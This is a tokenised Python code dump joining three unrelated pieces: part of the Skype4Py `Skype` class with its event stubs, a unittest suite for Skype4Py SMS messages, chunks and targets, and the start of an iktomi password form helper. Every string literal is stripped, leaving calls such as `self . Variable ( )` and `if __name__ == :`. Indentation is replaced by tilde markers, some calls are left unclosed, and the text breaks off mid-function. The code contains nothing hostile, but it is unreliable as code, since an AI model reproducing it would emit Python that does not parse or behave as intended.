~~ Conferences = property ( _GetConferences , \n 
doc = """Queries a list of call conferences.\n\n    :type: `ConferenceCollection`\n    """ ) \n 
\n 
def _GetConnectionStatus ( self ) : \n 
~~~ return str ( self . Variable ( ) ) \n 
\n 
~~ ConnectionStatus = property ( _GetConnectionStatus , \n 
doc = """Queries the connection status of the Skype client.\n\n    :type: `enums`.con*\n    """ ) \n 
\n 
def _GetConvert ( self ) : \n 
~~~ return self . _Convert \n 
\n 
~~ Convert = property ( _GetConvert , \n 
doc = """Queries the conversion object.\n\n    :type: `Conversion`\n    """ ) \n 
\n 
def _GetCurrentUser ( self ) : \n 
~~~ return User ( self , self . CurrentUserHandle ) \n 
\n 
~~ CurrentUser = property ( _GetCurrentUser , \n 
doc = """Queries the current user object.\n\n    :type: `user.User`\n    """ ) \n 
\n 
def _GetCurrentUserHandle ( self ) : \n 
~~~ return str ( self . Variable ( ) ) \n 
\n 
~~ CurrentUserHandle = property ( _GetCurrentUserHandle , \n 
doc = """Queries the Skypename of the current user.\n\n    :type: str\n    """ ) \n 
\n 
def _GetCurrentUserProfile ( self ) : \n 
~~~ return self . _Profile \n 
\n 
~~ CurrentUserProfile = property ( _GetCurrentUserProfile , \n 
doc = """Queries the user profile object.\n\n    :type: `Profile`\n    """ ) \n 
\n 
def _GetCurrentUserStatus ( self ) : \n 
~~~ return str ( self . Variable ( ) ) \n 
\n 
~~ def _SetCurrentUserStatus ( self , Value ) : \n 
~~~ self . Variable ( , str ( Value ) ) \n 
\n 
~~ CurrentUserStatus = property ( _GetCurrentUserStatus , _SetCurrentUserStatus , \n 
doc = """Queries/sets the online status of the current user.\n\n    :type: `enums`.ols*\n    """ ) \n 
\n 
def _GetCustomGroups ( self ) : \n 
~~~ return GroupCollection ( self , self . _Search ( , ) ) \n 
\n 
~~ CustomGroups = property ( _GetCustomGroups , \n 
doc = """Queries the list of custom contact groups. Custom groups are contact groups defined by the user.\n\n    :type: `GroupCollection`\n    """ ) \n 
\n 
def _GetFileTransfers ( self ) : \n 
~~~ return FileTransferCollection ( self , self . _Search ( ) ) \n 
\n 
~~ FileTransfers = property ( _GetFileTransfers , \n 
doc = """Queries all file transfers.\n\n    :type: `FileTransferCollection`\n    """ ) \n 
\n 
def _GetFocusedContacts ( self ) : \n 
# we have to use _DoCommand() directly because for unknown reason the API returns \n 
# "CONTACTS FOCUSED" instead of "CONTACTS_FOCUSED" (note the space instead of "_") \n 
~~~ return UserCollection ( self , split ( chop ( self . _DoCommand ( , \n 
~~ FocusedContacts = property ( _GetFocusedContacts , \n 
doc = """Queries a list of contacts selected in the contacts list.\n\n    :type: `UserCollection`\n    """ ) \n 
\n 
def _GetFriendlyName ( self ) : \n 
~~~ return self . _Api . friendly_name \n 
\n 
~~ def _SetFriendlyName ( self , Value ) : \n 
~~~ self . _Api . set_friendly_name ( tounicode ( Value ) ) \n 
\n 
~~ FriendlyName = property ( _GetFriendlyName , _SetFriendlyName , \n 
doc = """Queries/sets a "friendly" name for an application.\n\n    :type: unicode\n    """ ) \n 
\n 
def _GetFriends ( self ) : \n 
~~~ return UserCollection ( self , self . _Search ( ) ) \n 
\n 
~~ Friends = property ( _GetFriends , \n 
doc = """Queries the users in a contact list.\n\n    :type: `UserCollection`\n    """ ) \n 
\n 
def _GetGroups ( self ) : \n 
~~~ return GroupCollection ( self , self . _Search ( , ) ) \n 
\n 
~~ Groups = property ( _GetGroups , \n 
doc = """Queries the list of all contact groups.\n\n    :type: `GroupCollection`\n    """ ) \n 
\n 
def _GetHardwiredGroups ( self ) : \n 
~~~ return GroupCollection ( self , self . _Search ( , ) ) \n 
\n 
~~ HardwiredGroups = property ( _GetHardwiredGroups , \n 
doc = """Queries the list of hardwired contact groups. Hardwired groups are "smart" contact groups,\n    defined by Skype, that cannot be removed.\n\n    :type: `GroupCollection`\n    """ ) \n 
\n 
def _GetMissedCalls ( self ) : \n 
~~~ return CallCollection ( self , self . _Search ( ) ) \n 
\n 
~~ MissedCalls = property ( _GetMissedCalls , \n 
doc = """Queries a list of missed calls.\n\n    :type: `CallCollection`\n    """ ) \n 
\n 
def _GetMissedChats ( self ) : \n 
~~~ return ChatCollection ( self , self . _Search ( ) ) \n 
\n 
~~ MissedChats = property ( _GetMissedChats , \n 
doc = """Queries a list of missed chats.\n\n    :type: `ChatCollection`\n    """ ) \n 
\n 
def _GetMissedMessages ( self ) : \n 
~~~ return ChatMessageCollection ( self , self . _Search ( ) ) \n 
\n 
~~ MissedMessages = property ( _GetMissedMessages , \n 
doc = """Queries a list of missed chat messages.\n\n    :type: `ChatMessageCollection`\n    """ ) \n 
\n 
def _GetMissedSmss ( self ) : \n 
~~~ return SmsMessageCollection ( self , self . _Search ( ) ) \n 
\n 
~~ MissedSmss = property ( _GetMissedSmss , \n 
doc = """Requests a list of all missed SMS messages.\n\n    :type: `SmsMessageCollection`\n    """ ) \n 
\n 
def _GetMissedVoicemails ( self ) : \n 
~~~ return VoicemailCollection ( self , self . _Search ( ) ) \n 
\n 
~~ MissedVoicemails = property ( _GetMissedVoicemails , \n 
doc = """Requests a list of missed voicemails.\n\n    :type: `VoicemailCollection`\n    """ ) \n 
\n 
def _GetMute ( self ) : \n 
~~~ return self . Variable ( ) == \n 
\n 
~~ def _SetMute ( self , Value ) : \n 
~~~ self . Variable ( , cndexp ( Value , , ) ) \n 
\n 
~~ Mute = property ( _GetMute , _SetMute , \n 
doc = """Queries/sets the mute status of the Skype client.\n\n    Type: bool\n    Note: This value can be set only when there is an active call.\n\n    :type: bool\n    """ ) \n 
\n 
def _GetPredictiveDialerCountry ( self ) : \n 
~~~ return str ( self . Variable ( ) ) \n 
\n 
~~ PredictiveDialerCountry = property ( _GetPredictiveDialerCountry , \n 
doc = """Returns predictive dialler country as an ISO code.\n\n    :type: str\n    """ ) \n 
\n 
def _GetProtocol ( self ) : \n 
~~~ return self . _Api . protocol \n 
\n 
~~ def _SetProtocol ( self , Value ) : \n 
~~~ self . _DoCommand ( % Value ) \n 
self . _Api . protocol = int ( Value ) \n 
\n 
~~ Protocol = property ( _GetProtocol , _SetProtocol , \n 
doc = """Queries/sets the protocol version used by the Skype client.\n\n    :type: int\n    """ ) \n 
\n 
def _GetRecentChats ( self ) : \n 
~~~ return ChatCollection ( self , self . _Search ( ) ) \n 
\n 
~~ RecentChats = property ( _GetRecentChats , \n 
doc = """Queries a list of recent chats.\n\n    :type: `ChatCollection`\n    """ ) \n 
\n 
def _GetSettings ( self ) : \n 
~~~ return self . _Settings \n 
\n 
~~ Settings = property ( _GetSettings , \n 
doc = """Queries the settings for Skype general parameters.\n\n    :type: `Settings`\n    """ ) \n 
\n 
def _GetSilentMode ( self ) : \n 
~~~ return self . _Property ( , , , Cache = False ) == \n 
\n 
~~ def _SetSilentMode ( self , Value ) : \n 
~~~ self . _Property ( , , , cndexp ( Value , , ) , Cache = False ) \n 
\n 
~~ SilentMode = property ( _GetSilentMode , _SetSilentMode , \n 
doc = """Returns/sets Skype silent mode status.\n\n    :type: bool\n    """ ) \n 
\n 
def _GetSmss ( self ) : \n 
~~~ return SmsMessageCollection ( self , self . _Search ( ) ) \n 
\n 
~~ Smss = property ( _GetSmss , \n 
doc = """Requests a list of all SMS messages.\n\n    :type: `SmsMessageCollection`\n    """ ) \n 
\n 
def _GetTimeout ( self ) : \n 
~~~ return self . _Timeout \n 
\n 
~~ def _SetTimeout ( self , Value ) : \n 
~~~ if not isinstance ( Value , ( int , long , float ) ) : \n 
~~~ raise TypeError ( % repr ( type ( Value ) ) ) \n 
~~ self . _Timeout = Value \n 
\n 
~~ Timeout = property ( _GetTimeout , _SetTimeout , \n 
doc = """Queries/sets the wait timeout value. This timeout value applies to every command sent\n    to the Skype API and to attachment requests (see `Attach`). If a response is not received\n    during the timeout period, an `SkypeAPIError` exception is raised.\n\n    The units depend on the type. For float it is the number of seconds (or fractions thereof),\n    for int or long it is the number of milliseconds. Floats are commonly used in Python modules\n    to express timeouts (time.sleep() for example). Milliseconds are supported because that\'s\n    what the Skype4COM library uses. Skype4Py support for real float timeouts was introduced\n    in version 1.0.31.1.\n\n    The default value is 30000 milliseconds (int).\n\n    :type: float, int or long\n    """ ) \n 
\n 
def _GetUsersWaitingAuthorization ( self ) : \n 
~~~ return UserCollection ( self , self . _Search ( ) ) \n 
\n 
~~ UsersWaitingAuthorization = property ( _GetUsersWaitingAuthorization , \n 
doc = """Queries the list of users waiting for authorization.\n\n    :type: `UserCollection`\n    """ ) \n 
\n 
def _GetVersion ( self ) : \n 
~~~ return str ( self . Variable ( ) ) \n 
\n 
~~ Version = property ( _GetVersion , \n 
doc = """Queries the application version of the Skype client.\n\n    :type: str\n    """ ) \n 
\n 
def _GetVoicemails ( self ) : \n 
~~~ return VoicemailCollection ( self , self . _Search ( ) ) \n 
\n 
~~ Voicemails = property ( _GetVoicemails , \n 
doc = """Queries a list of voicemails.\n\n    :type: `VoicemailCollection`\n    """ ) \n 
\n 
\n 
~~ class SkypeEvents ( object ) : \n 
~~~ """Events defined in `Skype`.\n\n    See `EventHandlingBase` for more information on events.\n    """ \n 
\n 
def ApplicationConnecting ( self , App , Users ) : \n 
~~~ """This event is triggered when list of users connecting to an application changes.\n\n        :Parameters:\n          App : `Application`\n            Application object.\n          Users : `UserCollection`\n            Connecting users.\n        """ \n 
\n 
~~ def ApplicationDatagram ( self , App , Stream , Text ) : \n 
~~~ """This event is caused by the arrival of an application datagram.\n\n        :Parameters:\n          App : `Application`\n            Application object.\n          Stream : `ApplicationStream`\n            Application stream that received the datagram.\n          Text : unicode\n            The datagram text.\n        """ \n 
\n 
~~ def ApplicationReceiving ( self , App , Streams ) : \n 
~~~ """This event is triggered when list of application receiving streams changes.\n\n        :Parameters:\n          App : `Application`\n            Application object.\n          Streams : `ApplicationStreamCollection`\n            Application receiving streams.\n        """ \n 
\n 
~~ def ApplicationSending ( self , App , Streams ) : \n 
~~~ """This event is triggered when list of application sending streams changes.\n\n        :Parameters:\n          App : `Application`\n            Application object.\n          Streams : `ApplicationStreamCollection`\n            Application sending streams.\n        """ \n 
\n 
~~ def ApplicationStreams ( self , App , Streams ) : \n 
~~~ """This event is triggered when list of application streams changes.\n\n        :Parameters:\n          App : `Application`\n            Application object.\n          Streams : `ApplicationStreamCollection`\n            Application streams.\n        """ \n 
\n 
~~ def AsyncSearchUsersFinished ( self , Cookie , Users ) : \n 
~~~ """This event occurs when an asynchronous search is completed.\n\n        :Parameters:\n          Cookie : int\n            Search identifier as returned by `Skype.AsyncSearchUsers`.\n          Users : `UserCollection`\n            Found users.\n\n        :see: `Skype.AsyncSearchUsers`\n        """ \n 
\n 
~~ def AttachmentStatus ( self , Status ) : \n 
~~~ """This event is caused by a change in the status of an attachment to the Skype API.\n\n        :Parameters:\n          Status : `enums`.apiAttach*\n            New attachment status.\n        """ \n 
\n 
~~ def AutoAway ( self , Automatic ) : \n 
~~~ """This event is caused by a change of auto away status.\n\n        :Parameters:\n          Automatic : bool\n            New auto away status.\n        """ \n 
\n 
~~ def CallDtmfReceived ( self , Call , Code ) : \n 
~~~ """This event is caused by a call DTMF event.\n\n        :Parameters:\n          Call : `Call`\n            Call object.\n          Code : str\n            Received DTMF code.\n        """ \n 
\n 
~~ def CallHistory ( self ) : \n 
~~~ """This event is caused by a change in call history.\n        """ \n 
\n 
~~ def CallInputStatusChanged ( self , Call , Active ) : \n 
~~~ """This event is caused by a change in the Call voice input status change.\n\n        :Parameters:\n          Call : `Call`\n            Call object.\n          Active : bool\n            New voice input status (active when True).\n        """ \n 
\n 
~~ def CallSeenStatusChanged ( self , Call , Seen ) : \n 
~~~ """This event occurs when the seen status of a call changes.\n\n        :Parameters:\n          Call : `Call`\n            Call object.\n          Seen : bool\n            True if call was seen.\n\n        :see: `Call.Seen`\n        """ \n 
\n 
~~ def CallStatus ( self , Call , Status ) : \n 
~~~ """This event is caused by a change in call status.\n\n        :Parameters:\n          Call : `Call`\n            Call object.\n          Status : `enums`.cls*\n            New status of the call.\n        """ \n 
\n 
~~ def CallTransferStatusChanged ( self , Call , Status ) : \n 
~~~ """This event occurs when a call transfer status changes.\n\n        :Parameters:\n          Call : `Call`\n            Call object.\n          Status : `enums`.cls*\n            New status of the call transfer.\n        """ \n 
\n 
~~ def CallVideoReceiveStatusChanged ( self , Call , Status ) : \n 
~~~ """This event occurs when a call video receive status changes.\n\n        :Parameters:\n          Call : `Call`\n            Call object.\n          Status : `enums`.vss*\n            New video receive status of the call.\n        """ \n 
\n 
~~ def CallVideoSendStatusChanged ( self , Call , Status ) : \n 
~~~ """This event occurs when a call video send status changes.\n\n        :Parameters:\n          Call : `Call`\n            Call object.\n          Status : `enums`.vss*\n            New video send status of the call.\n        """ \n 
\n 
~~ def CallVideoStatusChanged ( self , Call , Status ) : \n 
~~~ """This event occurs when a call video status changes.\n\n        :Parameters:\n          Call : `Call`\n            Call object.\n          Status : `enums`.cvs*\n            New video status of the call.\n        """ \n 
\n 
~~ def ChatMemberRoleChanged ( self , Member , Role ) : \n 
~~~ """This event occurs when a chat member role changes.\n\n        :Parameters:\n          Member : `ChatMember`\n            Chat member object.\n          Role : `enums`.chatMemberRole*\n            New member role.\n        """ \n 
\n 
~~ def ChatMembersChanged ( self , Chat , Members ) : \n 
~~~ """This event occurs when a list of chat members change.\n\n        :Parameters:\n          Chat : `Chat`\n            Chat object.\n          Members : `UserCollection`\n            Chat members.\n        """ \n 
\n 
~~ def ChatWindowState ( self , Chat , State ) : \n 
~~~ """This event occurs when chat window is opened or closed.\n\n        :Parameters:\n          Chat : `Chat`\n            Chat object.\n          State : bool\n            True if the window was opened or False if closed.\n        """ \n 
\n 
~~ def ClientWindowState ( self , State ) : \n 
~~~ """This event occurs when the state of the client window changes.\n\n        :Parameters:\n          State : `enums`.wnd*\n            New window state.\n        """ \n 
\n 
~~ def Command ( self , command ) : \n 
~~~ """This event is triggered when a command is sent to the Skype API.\n\n        :Parameters:\n          command : `Command`\n            Command object.\n        """ \n 
\n 
~~ def ConnectionStatus ( self , Status ) : \n 
~~~ """This event is caused by a connection status change.\n\n        :Parameters:\n          Status : `enums`.con*\n            New connection status.\n        """ \n 
\n 
~~ def ContactsFocused ( self , Username ) : \n 
~~~ """This event is caused by a change in contacts focus.\n\n        :Parameters:\n          Username : str\n            Name of the user that was focused or empty string if focus was lost.\n        """ \n 
\n 
~~ def Error ( self , command , Number , Description ) : \n 
~~~ """This event is triggered when an error occurs during execution of an API command.\n\n        :Parameters:\n          command : `Command`\n            Command object that caused the error.\n          Number : int\n            Error number returned by the Skype API.\n          Description : unicode\n            Description of the error.\n        """ \n 
\n 
~~ def FileTransferStatusChanged ( self , Transfer , Status ) : \n 
~~~ """This event occurs when a file transfer status changes.\n\n        :Parameters:\n          Transfer : `FileTransfer`\n            File transfer object.\n          Status : `enums`.fileTransferStatus*\n            New status of the file transfer.\n        """ \n 
\n 
~~ def GroupDeleted ( self , GroupId ) : \n 
~~~ """This event is caused by a user deleting a custom contact group.\n\n        :Parameters:\n          GroupId : int\n            Id of the deleted group.\n        """ \n 
\n 
~~ def GroupExpanded ( self , Group , Expanded ) : \n 
~~~ """This event is caused by a user expanding or collapsing a group in the contacts tab.\n\n        :Parameters:\n          Group : `Group`\n            Group object.\n          Expanded : bool\n            Tells if the group is expanded (True) or collapsed (False).\n        """ \n 
\n 
~~ def GroupUsers ( self , Group , Count ) : \n 
~~~ """This event is caused by a change in a contact group members.\n\n        :Parameters:\n          Group : `Group`\n            Group object.\n          Count : int\n            Number of group members.\n\n        :note: This event is different from its Skype4COM equivalent in that the second\n               parameter is number of users instead of `UserCollection` object. This\n               object may be obtained using ``Group.Users`` property.\n        """ \n 
\n 
~~ def GroupVisible ( self , Group , Visible ) : \n 
~~~ """This event is caused by a user hiding/showing a group in the contacts tab.\n\n        :Parameters:\n          Group : `Group`\n            Group object.\n          Visible : bool\n            Tells if the group is visible or not.\n        """ \n 
\n 
~~ def MessageHistory ( self , Username ) : \n 
~~~ """This event is caused by a change in message history.\n\n        :Parameters:\n          Username : str\n            Name of the user whose message history changed.\n        """ \n 
\n 
~~ def MessageStatus ( self , Message , Status ) : \n 
~~~ """This event is caused by a change in chat message status.\n\n        :Parameters:\n          Message : `ChatMessage`\n            Chat message object.\n          Status : `enums`.cms*\n            New status of the chat message.\n        """ \n 
\n 
~~ def Mute ( self , Mute ) : \n 
~~~ """This event is caused by a change in mute status.\n\n        :Parameters:\n          Mute : bool\n            New mute status.\n        """ \n 
\n 
~~ def Notify ( self , Notification ) : \n 
~~~ """This event is triggered whenever Skype client sends a notification.\n\n        :Parameters:\n          Notification : unicode\n            Notification string.\n\n        :note: Use this event only if there is no dedicated one.\n        """ \n 
\n 
~~ def OnlineStatus ( self , User , Status ) : \n 
~~~ """This event is caused by a change in the online status of a user.\n\n        :Parameters:\n          User : `User`\n            User object.\n          Status : `enums`.ols*\n            New online status of the user.\n        """ \n 
\n 
~~ def PluginEventClicked ( self , Event ) : \n 
~~~ """This event occurs when a user clicks on a plug-in event.\n\n        :Parameters:\n          Event : `PluginEvent`\n            Plugin event object.\n        """ \n 
\n 
~~ def PluginMenuItemClicked ( self , MenuItem , Users , PluginContext , ContextId ) : \n 
~~~ """This event occurs when a user clicks on a plug-in menu item.\n\n        :Parameters:\n          MenuItem : `PluginMenuItem`\n            Menu item object.\n          Users : `UserCollection`\n            Users this item refers to.\n          PluginContext : unicode\n            Plug-in context.\n          ContextId : str or int\n            Context Id. Chat name for chat context or Call ID for call context.\n\n        :see: `PluginMenuItem`\n        """ \n 
\n 
~~ def Reply ( self , command ) : \n 
~~~ """This event is triggered when the API replies to a command object.\n\n        :Parameters:\n          command : `Command`\n            Command object.\n        """ \n 
\n 
~~ def SilentModeStatusChanged ( self , Silent ) : \n 
~~~ """This event occurs when a silent mode is switched off.\n\n        :Parameters:\n          Silent : bool\n            Skype client silent status.\n        """ \n 
\n 
~~ def SmsMessageStatusChanged ( self , Message , Status ) : \n 
~~~ """This event is caused by a change in the SMS message status.\n\n        :Parameters:\n          Message : `SmsMessage`\n            SMS message object.\n          Status : `enums`.smsMessageStatus*\n            New status of the SMS message.\n        """ \n 
\n 
~~ def SmsTargetStatusChanged ( self , Target , Status ) : \n 
~~~ """This event is caused by a change in the SMS target status.\n\n        :Parameters:\n          Target : `SmsTarget`\n            SMS target object.\n          Status : `enums`.smsTargetStatus*\n            New status of the SMS target.\n        """ \n 
\n 
~~ def UserAuthorizationRequestReceived ( self , User ) : \n 
~~~ """This event occurs when user sends you an authorization request.\n\n        :Parameters:\n          User : `User`\n            User object.\n        """ \n 
\n 
~~ def UserMood ( self , User , MoodText ) : \n 
~~~ """This event is caused by a change in the mood text of the user.\n\n        :Parameters:\n          User : `User`\n            User object.\n          MoodText : unicode\n            New mood text.\n        """ \n 
\n 
~~ def UserStatus ( self , Status ) : \n 
~~~ """This event is caused by a user status change.\n\n        :Parameters:\n          Status : `enums`.cus*\n            New user status.\n        """ \n 
\n 
~~ def VoicemailStatus ( self , Mail , Status ) : \n 
~~~ """This event is caused by a change in voicemail status.\n\n        :Parameters:\n          Mail : `Voicemail`\n            Voicemail object.\n          Status : `enums`.vms*\n            New status of the voicemail.\n        """ \n 
\n 
~~ def WallpaperChanged ( self , Path ) : \n 
~~~ """This event occurs when client wallpaper changes.\n\n        :Parameters:\n          Path : str\n            Path to new wallpaper bitmap.\n        """ \n 
\n 
\n 
~~ ~~ Skype . _AddEvents ( SkypeEvents ) \n 
import unittest \n 
\n 
import skype4pytest \n 
from Skype4Py . sms import * \n 
\n 
\n 
class SmsMessageTest ( skype4pytest . TestCase ) : \n 
~~~ def setUpObject ( self ) : \n 
~~~ self . obj = SmsMessage ( self . skype , ) \n 
\n 
# Methods \n 
# ======= \n 
\n 
~~ def testDelete ( self ) : \n 
~~~ self . api . enqueue ( ) \n 
self . obj . Delete ( ) \n 
self . failUnless ( self . api . is_empty ( ) ) \n 
\n 
~~ def testMarkAsSeen ( self ) : \n 
~~~ self . api . enqueue ( , \n 
) \n 
self . obj . MarkAsSeen ( ) \n 
self . failUnless ( self . api . is_empty ( ) ) \n 
\n 
~~ def testSend ( self ) : \n 
~~~ self . api . enqueue ( ) \n 
self . obj . Send ( ) \n 
self . failUnless ( self . api . is_empty ( ) ) \n 
\n 
# Properties \n 
# ========== \n 
\n 
~~ def testBody ( self ) : \n 
# Readable, Writable, Type: unicode \n 
~~~ self . api . enqueue ( , \n 
) \n 
t = self . obj . Body \n 
self . assertInstance ( t , unicode ) \n 
self . assertEqual ( t , ) \n 
self . failUnless ( self . api . is_empty ( ) ) \n 
self . api . enqueue ( , \n 
) \n 
self . obj . Body = \n 
self . failUnless ( self . api . is_empty ( ) ) \n 
\n 
~~ def testChunks ( self ) : \n 
# Readable, Type: SmsChunkCollection \n 
~~~ self . api . enqueue ( , \n 
) \n 
t = self . obj . Chunks \n 
self . assertInstance ( t , SmsChunkCollection ) \n 
self . assertEqual ( len ( t ) , 2 ) \n 
self . failUnless ( self . api . is_empty ( ) ) \n 
\n 
~~ def testDatetime ( self ) : \n 
# Readable, Type: datetime \n 
~~~ from datetime import datetime \n 
from time import time \n 
now = time ( ) \n 
self . api . enqueue ( , \n 
% now ) \n 
t = self . obj . Datetime \n 
self . assertInstance ( t , datetime ) \n 
self . assertEqual ( t , datetime . fromtimestamp ( now ) ) \n 
self . failUnless ( self . api . is_empty ( ) ) \n 
\n 
~~ def testFailureReason ( self ) : \n 
# Readable, Type: str \n 
~~~ self . api . enqueue ( , \n 
) \n 
t = self . obj . FailureReason \n 
self . assertInstance ( t , str ) \n 
self . assertEqual ( t , ) \n 
self . failUnless ( self . api . is_empty ( ) ) \n 
\n 
~~ def testId ( self ) : \n 
# Readable, Type: int \n 
~~~ t = self . obj . Id \n 
self . assertInstance ( t , int ) \n 
self . assertEqual ( t , 1234 ) \n 
\n 
~~ def testIsFailedUnseen ( self ) : \n 
# Readable, Type: bool \n 
~~~ self . api . enqueue ( , \n 
) \n 
t = self . obj . IsFailedUnseen \n 
self . assertInstance ( t , bool ) \n 
self . assertEqual ( t , True ) \n 
self . failUnless ( self . api . is_empty ( ) ) \n 
\n 
~~ def testPrice ( self ) : \n 
# Readable, Type: int \n 
~~~ self . api . enqueue ( , \n 
) \n 
t = self . obj . Price \n 
self . assertInstance ( t , int ) \n 
self . assertEqual ( t , 123 ) \n 
self . failUnless ( self . api . is_empty ( ) ) \n 
\n 
~~ def testPriceCurrency ( self ) : \n 
# Readable, Type: unicode \n 
~~~ self . api . enqueue ( , \n 
) \n 
t = self . obj . PriceCurrency \n 
self . assertInstance ( t , unicode ) \n 
self . assertEqual ( t , ) \n 
self . failUnless ( self . api . is_empty ( ) ) \n 
\n 
~~ def testPricePrecision ( self ) : \n 
# Readable, Type: int \n 
~~~ self . api . enqueue ( , \n 
) \n 
t = self . obj . PricePrecision \n 
self . assertInstance ( t , int ) \n 
self . assertEqual ( t , 3 ) \n 
self . failUnless ( self . api . is_empty ( ) ) \n 
\n 
~~ def testPriceToText ( self ) : \n 
# Readable, Type: unicode \n 
~~~ self . api . enqueue ( , \n 
) \n 
self . api . enqueue ( , \n 
) \n 
self . api . enqueue ( , \n 
) \n 
t = self . obj . PriceToText \n 
self . assertInstance ( t , unicode ) \n 
self . assertEqual ( t , ) \n 
self . failUnless ( self . api . is_empty ( ) ) \n 
\n 
~~ def testPriceValue ( self ) : \n 
# Readable, Type: float \n 
~~~ self . api . enqueue ( , \n 
) \n 
self . api . enqueue ( , \n 
) \n 
t = self . obj . PriceValue \n 
self . assertInstance ( t , float ) \n 
self . assertEqual ( t , 0.123 ) \n 
self . failUnless ( self . api . is_empty ( ) ) \n 
\n 
~~ def testReplyToNumber ( self ) : \n 
# Readable, Writable, Type: str \n 
~~~ self . api . enqueue ( , \n 
) \n 
t = self . obj . ReplyToNumber \n 
self . assertInstance ( t , str ) \n 
self . assertEqual ( t , ) \n 
self . failUnless ( self . api . is_empty ( ) ) \n 
self . api . enqueue ( , \n 
) \n 
self . obj . ReplyToNumber = \n 
self . failUnless ( self . api . is_empty ( ) ) \n 
\n 
~~ def testSeen ( self ) : \n 
# Writable, Type: bool \n 
~~~ from warnings import simplefilter \n 
self . api . enqueue ( , \n 
) \n 
simplefilter ( ) \n 
try : \n 
~~~ self . obj . Seen = True \n 
~~ finally : \n 
~~~ simplefilter ( ) \n 
~~ self . failUnless ( self . api . is_empty ( ) ) \n 
\n 
~~ def testStatus ( self ) : \n 
# Readable, Type: str \n 
~~~ self . api . enqueue ( , \n 
) \n 
t = self . obj . Status \n 
self . assertInstance ( t , str ) \n 
self . assertEqual ( t , ) \n 
self . failUnless ( self . api . is_empty ( ) ) \n 
\n 
~~ def testTargetNumbers ( self ) : \n 
# Readable, Writable, Type: tuple of str \n 
~~~ self . api . enqueue ( , \n 
) \n 
t = self . obj . TargetNumbers \n 
self . assertInstance ( t , tuple ) \n 
self . assertEqual ( len ( t ) , 2 ) \n 
self . failUnless ( self . api . is_empty ( ) ) \n 
self . api . enqueue ( , \n 
) \n 
self . obj . TargetNumbers = ( , ) \n 
self . failUnless ( self . api . is_empty ( ) ) \n 
\n 
~~ def testTargets ( self ) : \n 
# Readable, Type: SmsTargetCollection \n 
~~~ self . api . enqueue ( , \n 
) \n 
t = self . obj . Targets \n 
self . assertInstance ( t , SmsTargetCollection ) \n 
self . assertEqual ( len ( t ) , 2 ) \n 
self . failUnless ( self . api . is_empty ( ) ) \n 
\n 
~~ def testTimestamp ( self ) : \n 
# Readable, Type: float \n 
~~~ self . api . enqueue ( , \n 
) \n 
t = self . obj . Timestamp \n 
self . assertInstance ( t , float ) \n 
self . assertEqual ( t , 123.4 ) \n 
self . failUnless ( self . api . is_empty ( ) ) \n 
\n 
~~ def testType ( self ) : \n 
# Readable, Type: str \n 
~~~ self . api . enqueue ( , \n 
) \n 
t = self . obj . Type \n 
self . assertInstance ( t , str ) \n 
self . assertEqual ( t , ) \n 
self . failUnless ( self . api . is_empty ( ) ) \n 
\n 
\n 
~~ ~~ class SmsChunkTest ( skype4pytest . TestCase ) : \n 
~~~ def setUpObject ( self ) : \n 
~~~ self . obj = SmsChunk ( SmsMessage ( self . skype , ) , 1 ) \n 
\n 
# Properties \n 
# ========== \n 
\n 
~~ def testCharactersLeft ( self ) : \n 
# Readable, Type: int \n 
~~~ self . api . enqueue ( , \n 
) \n 
t = self . obj . CharactersLeft \n 
self . assertInstance ( t , int ) \n 
self . assertEqual ( t , 30 ) \n 
self . failUnless ( self . api . is_empty ( ) ) \n 
\n 
~~ def testId ( self ) : \n 
# Readable, Type: int \n 
~~~ t = self . obj . Id \n 
self . assertInstance ( t , int ) \n 
self . assertEqual ( t , 1 ) \n 
\n 
~~ def testMessage ( self ) : \n 
# Readable, Type: SmsMessage \n 
~~~ t = self . obj . Message \n 
self . assertInstance ( t , SmsMessage ) \n 
self . assertEqual ( t . Id , 1234 ) \n 
\n 
~~ def testText ( self ) : \n 
# Readable, Type: unicode \n 
~~~ self . api . enqueue ( , \n 
) \n 
t = self . obj . Text \n 
self . assertInstance ( t , unicode ) \n 
self . assertEqual ( t , ) \n 
self . failUnless ( self . api . is_empty ( ) ) \n 
\n 
\n 
~~ ~~ class SmsTargetTest ( skype4pytest . TestCase ) : \n 
~~~ def setUpObject ( self ) : \n 
~~~ self . obj = SmsTarget ( SmsMessage ( self . skype , ) , ) \n 
\n 
# Properties \n 
# ========== \n 
\n 
~~ def testMessage ( self ) : \n 
# Readable, Type: SmsMessage \n 
~~~ t = self . obj . Message \n 
self . assertInstance ( t , SmsMessage ) \n 
self . assertEqual ( t . Id , 1234 ) \n 
\n 
~~ def testNumber ( self ) : \n 
# Readable, Type: str \n 
~~~ t = self . obj . Number \n 
self . assertInstance ( t , str ) \n 
self . assertEqual ( t , ) \n 
\n 
~~ def testStatus ( self ) : \n 
# Readable, Type: str \n 
~~~ self . api . enqueue ( , \n 
t = self . obj . Status \n 
self . assertInstance ( t , str ) \n 
self . assertEqual ( t , ) \n 
self . failUnless ( self . api . is_empty ( ) ) \n 
\n 
\n 
~~ ~~ def suite ( ) : \n 
~~~ return unittest . TestSuite ( [ \n 
unittest . defaultTestLoader . loadTestsFromTestCase ( SmsMessageTest ) , \n 
unittest . defaultTestLoader . loadTestsFromTestCase ( SmsChunkTest ) , \n 
unittest . defaultTestLoader . loadTestsFromTestCase ( SmsTargetTest ) , \n 
] ) \n 
\n 
\n 
~~ if __name__ == : \n 
~~~ unittest . main ( ) \n 
# -*- coding: utf-8 -*- \n 
\n 
~~ from . import convs , widgets , fields \n 
from iktomi . utils . i18n import N_ \n 
\n 
\n 
class PasswordConv ( convs . Char ) : \n 
\n 
~~~ error_mismatch = N_ ( ) \n 
error_required = N_ ( ) \n 
\n 
def from_python ( self , value ) : \n 
~~~ return dict ( [ ( field . name , None ) for field in self . field . fields ] ) \n 
\n 
~~ def get_initial ( self ) : \n 
~~~ return \n 
\n 
~~ def to_python ( self , value ) : \n 
~~~ etalon = value [ list ( value ) [ 0 ] ] \n 
for field in self . field . fields : \n 
~~~ self . assert_ ( value [ field . name ] == etalon , \n 
self . error_mismatch ) \n 
~~ if self . required : \n 
~~~ self . assert_ ( etalon not in ( None , ) , self . error_required ) \n 
~~ elif etalon in ( None , ) : \n 
~~~ return None \n 
~~ return etalon \n 
\n 
\n 
~~ ~~ def PasswordSet ( name = , \n 
min_length = 3 , max_length = 200 , required = False , \n 
password_label = None , confirm_label = , filters = ( ) , \n 
** kwargs ) : \n 
# class implementation has problem with Fieldset copying: \n 
\n 
~~~ char = convs . Char ( convs . length ( min_length , max_length ) , * filters , \n 
** dict ( required = required ) ) \n 
items = ( ( , password_label ) , ( , confirm_label ) ) \n 
